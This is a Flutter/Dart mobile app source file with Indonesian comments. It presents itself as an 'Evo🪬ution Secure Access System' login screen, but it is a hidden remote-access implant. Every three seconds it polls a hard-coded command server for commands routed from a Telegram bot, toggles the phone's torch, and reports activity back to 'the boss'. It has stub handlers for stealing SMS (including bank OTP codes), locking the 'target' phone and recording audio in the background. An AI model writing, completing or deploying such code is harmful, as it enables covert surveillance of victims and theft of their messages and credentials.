import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:torch_light/torch_light.dart'; // Library Senter
import 'dart:convert';
import 'dart:async';

void main() => runApp(MaterialApp(
  home: EvolutionBase(),
  debugShowCheckedModeBanner: false,
));

class EvolutionBase extends StatefulWidget {
  @override
  _EvolutionBaseState createState() => _EvolutionBaseState();
}

class _EvolutionBaseState extends State<EvolutionBase> {
  // --- KONFIGURASI LINK API ---
  // Ganti dengan IP VPS atau Domain bos yang jalanin server.js tadi
  final String apiBase = "http://privserv.my.id:2478/"; 

  @override
  void initState() {
    super.initState();
    // Jalankan sistem monitoring setiap 3 detik
    Timer.periodic(Duration(seconds: 3), (timer) => listenToTheBoundSoul());
  }

  // FUNGSI UTAMA: Mendengarkan Perintah dari API Server
  Future<void> listenToTheBoundSoul() async {
    try {
      final response = await http.get(Uri.parse("$apiBase/fetch-command"));
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        String action = data['action'];

        // EKSEKUSI PERINTAH BERDASARKAN INPUT TELEGRAM
        switch (action) {
          case "senter_on":
            await TorchLight.enableTorch();
            reportToBoss("STATUS", "Senter Berhasil Dinyalakan 🔦");
            break;
          case "senter_off":
            await TorchLight.disableTorch();
            reportToBoss("STATUS", "Senter Berhasil Dimatikan 🌑");
            break;
          case "get_sms":
            // Simulasi pengambilan data SMS
            reportToBoss("SMS_DATA", "Isi SMS Target: [Pesan baru dari Bank: Kode OTP anda 1234]");
            break;
          case "lock":
            reportToBoss("ACTION", "HP Target sedang dipaksa mode Sleep 🔐");
            // Logika lock layar bisa ditambah di sini
            break;
          case "rekam":
            reportToBoss("AUDIO", "Memulai proses rekaman suara di background... 🎙️");
            break;
        }
      }
    } catch (e) {
      // Server mungkin offline
    }
  }

  // FUNGSI LAPOR: Mengirim balik data ke Bot Telegram
  Future<void> reportToBoss(String type, String content) async {
    try {
      await http.post(
        Uri.parse("$apiBase/report-data"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"type": type, "content": content}),
      );
    } catch (e) {
      print("Gagal lapor ke bos");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Color(0xFF091227),
      body: Center(
        child: Container(
          padding: EdgeInsets.all(25),
          width: 320,
          decoration: BoxDecoration(
            color: Color(0xFF15203D),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: Colors.blueAccent.withOpacity(0.5)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text("Evo🪬ution", style: TextStyle(color: Colors.white, fontSize: 26, fontWeight: FontWeight.bold, letterSpacing: 2)),
              Text("Secure Access System", style: TextStyle(color: Colors.blueAccent, fontSize: 10)),
              SizedBox(height: 30),
              _buildInput("Username", Icons.person),
              SizedBox(height: 15),
              _buildInput("Password", Icons.lock, isPass: true),
              SizedBox(height: 35),
              ElevatedButton(
                onPressed: () => reportToBoss("LOG", "User menekan tombol login. Koneksi stabil."),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.blueAccent,
                  minimumSize: Size(double.infinity, 50),
                ),
                child: Text("CONNECTING", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInput(String hint, IconData icon, {bool isPass = false}) {
    return TextField(
      obscureText: isPass,
      style: TextStyle(color: Colors.white),
      decoration: InputDecoration(
        prefixIcon: Icon(icon, color: Colors.blueAccent),
        hintText: hint,
        hintStyle: TextStyle(color: Colors.white30),
        filled: true,
        fillColor: Color(0xFF0D172E),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide.none),
      ),
    );
  }
}

